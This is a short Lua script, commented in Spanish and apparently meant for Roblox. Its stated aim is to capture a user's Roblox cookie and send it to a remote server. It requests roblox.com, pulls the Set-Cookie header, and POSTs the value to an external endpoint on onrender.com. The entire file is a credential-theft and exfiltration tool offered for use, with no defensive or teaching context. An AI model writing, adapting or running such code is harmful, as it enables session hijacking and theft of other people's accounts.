-- Script para obtener y enviar la cookie de Roblox a un servidor

local function getRobloxCookie()
    local cookie = ""
    local httpService = game:GetService("HttpService")

    -- URL de la página de Roblox para obtener las cookies
    local url = "https://www.roblox.com"

    -- Realizar una solicitud HTTP para obtener las cookies
    local response = httpService:RequestAsync({
        Url = url,
        Method = "GET"
    })

    -- Extraer las cookies de la respuesta
    if response and response.Headers then
        for key, value in pairs(response.Headers) do
            if key:lower() == "set-cookie" then
                cookie = value
                break
            end
        end
    end

    return cookie
end

-- URL del servidor en Render
local serverUrl = "https://roblox-cookie-server.onrender.com/recibir"

-- Función para enviar las cookies al servidor
local function sendCookieToServer(cookie)
    local httpService = game:GetService("HttpService")
    local response = httpService:PostAsync(serverUrl, cookie)
    return response
end

-- Ejecutar la función y enviar la cookie obtenida al servidor
local robloxCookie = getRobloxCookie()
local response = sendCookieToServer(robloxCookie)
print("Respuesta del servidor:", response)
